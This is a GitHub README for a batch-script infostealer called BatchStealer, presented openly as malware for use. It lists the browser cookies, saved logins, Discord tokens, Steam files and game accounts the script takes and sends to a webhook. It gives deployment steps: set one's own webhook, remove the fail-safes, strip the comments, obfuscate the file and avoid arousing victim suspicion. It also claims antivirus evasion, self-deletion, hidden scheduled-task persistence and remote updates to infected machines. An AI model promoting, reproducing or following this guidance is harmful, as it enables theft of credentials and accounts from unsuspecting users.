# BatchStealer | [BatchStealer Example](https://github.com/Takaovi/BatchStealer-Example)

### 📜 A batch script for taking things and sending them to a webhook 

3.4.2021 < FUD [(Virustotal)](https://www.virustotal.com/gui/file/6dfc563da383268f927fd90834afe1f2b5757933ea7527029c94f5aa6ab08c0d/detection)

![visitors](https://visitor-badge.glitch.me/badge?page_id=takaovi.batchStealer)

# Screenshots

 <details>
  <summary>Discord Capture Example</summary>
 
  <p align="center">
  <img src="https://i.imgur.com/8tmguuS.jpg">
  </p>
  
  *Example report, not a real user. Firefox has no files as it wasn't installed on the machine.*
</details>

# How to use

### ⚠️ Windows 10 build 17063, or later (*cURL* is included)

1. Change the webhook to yours.
2. Remove the fail-safes. ("goto xxx")
3. Run the batch file.

### ❌ Get rid of the comments 📝
* Do a regex search on notepad++, match `^::.*\n` and replace with nothing.

### ⛔ Avoid
* Just changing the webhook and doing nothing else. 
  * If the batch file does nothing the user will open it to see what's wrong.

# Features

### 💉 Steals

*Almost everything is encrypted, I haven't had the patience to do that on a batch file*

 <details>
  <summary>Full system information</summary>
 
   * OS Name & Version
   * Product ID
   * System Manufacturer
   * Processor(s)
   * BIOS Version
   * Time Zone
   * Total Physical Memory
   * Network Card(s)
   * And more...
</details>
<details>
  <summary>Chrome</summary>
 
  * Cookies
  * History
  * Shortcuts
  * Bookmarks
  * Login Data
</details>
<details>
  <summary>Opera</summary>
 
  * Cookies
  * History
  * Shortcuts
  * Bookmarks
  * Login Data
</details>
<details>
  <summary>Vivaldi</summary>
 
  * Cookies
  * History
  * Shortcuts
  * Bookmarks
  * Login Data
</details>
<details>
  <summary>Firefox</summary>
 
  * Logins
  * key3
  * key4
  * Cookies (Plain text!)
</details>
<details>
  <summary>osu!</summary>
 
 * osu!.cfg
</details>
<details>
  <summary>Discord</summary>
 
  * File containing a Token
  * Other various files
</details>
<details>
  <summary>Steam</summary>
 
  * Logged in users (Username, email)
  * Hidden ssfn files
</details>
<details>
  <summary>Minecraft</summary>
 
* Launcher profiles and accounts
</details>
<details>
  <summary>Growtopia</summary>
 
  * Save.dat
</details>

### 📑 Other features 

<details>
  <summary>Other</summary>
 
  * Delete itself after execution

  * Add itself to Task Scheduler (CMD window will be invisible when executed)
     * Will make files to `C:\ProgramData` by default. (Hidden)

  * Push updates to infected machine(s) **(Beta, expect bugs and crashes)**
    * Make sure to have a working batch file's source on the link, it will replace everything.
    * Ability to target specific users (Check username)
</details>

# 💡 Support

* If you want to support the project do a pull request.
  * The pull request could be a new steal etc.

# ㊙️ Obfuscation
* You can try [this](https://github.com/SkyEmie/batch-obfuscator)
  * Clean the file before obfuscating it, remove all the comments and the features you don't use. Make the file as small as possible.

# Legal

None of the authors, contributors, or anyone else connected with this open source project, in any way whatsoever, can be responsible for your use of the information or the application contained in or linked from this repository.

Under Section 107 of the Copyright Act 1976, allowance is made for "fair use" for purposes such as criticism, comment, news reporting, teaching, scholarship and research. Fair use is a use permitted by copyright statute that might otherwise be infringing. Non-profit, educational or personal use tips the balance in favor of fair use.

If you don't agree with any of our disclaimers above, do not read the code or download anything from our repository as you have no permission to read and explore our repository until you agree.
